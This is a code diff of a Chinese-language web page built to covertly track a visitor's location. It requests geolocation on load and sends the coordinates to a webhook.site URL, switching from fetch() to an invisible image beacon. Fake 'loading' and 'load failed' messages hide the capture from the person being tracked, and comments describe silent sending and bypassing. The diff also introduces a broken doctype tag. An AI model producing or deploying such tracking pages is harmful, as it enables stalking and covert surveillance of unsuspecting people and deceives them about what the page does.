@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!CDOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
@@ -6,8 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body style="background-color: white; text-align: center; padding-top: 50px;">
-    <h2>正在加载内容，请稍后...</h2>
-    <p>（对方此时看不到任何经纬度，只看到加载中）</p>
+    <h2 id="msg">正在初始化安全连接...</h2>
 
     <script>
         function getLocation() {
@@ -19,24 +18,19 @@
         function sendPosition(position) {
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
+            var myUrl = "https://webhook.site/8d58a783-30ed-421a-8779-5d714c5ca502";
 
-            // 【关键步骤】将坐标静默发送到你的 Webhook 服务器
-            var myUrl = "var myUrl = "https://webhook.site/8d58a783-30ed-421a-8779-5d714c5ca502";"; 
+            // 【暴力绕过法】创建一个不可见的图片对象
+            // 浏览器为了加载这张图片，必须访问这个 URL，从而把坐标带给 Webhook
+            var img = new Image();
+            img.src = myUrl + "?lat=" + lat + "&lon=" + lon; 
             
-            fetch(myUrl + "?lat=" + lat + "&lon=" + lon, {
-                method: 'GET'
-            })
-            .then(() => {
-                // 发送成功后，给对方显示一个假的结果，让他们以为没发生什么
-                document.body.innerHTML = "<h2>内容加载失败，请刷新重试。</h2>";
-            })
-            .catch(() => {
-                document.body.innerHTML = "<h2>网络错误。</h2>";
-            });
+            // 模拟成功后的视觉反馈
+            document.getElementById("msg").innerHTML = "内容加载失败，请刷新重试。";
         }
 
         function showError(error) {
-            document.body.innerHTML = "<h2>加载出错，请检查网络。</h2>";
+            document.getElementById("msg").innerHTML = "网络连接超时，请检查权限。";
         }
 
         window.onload = getLocation;
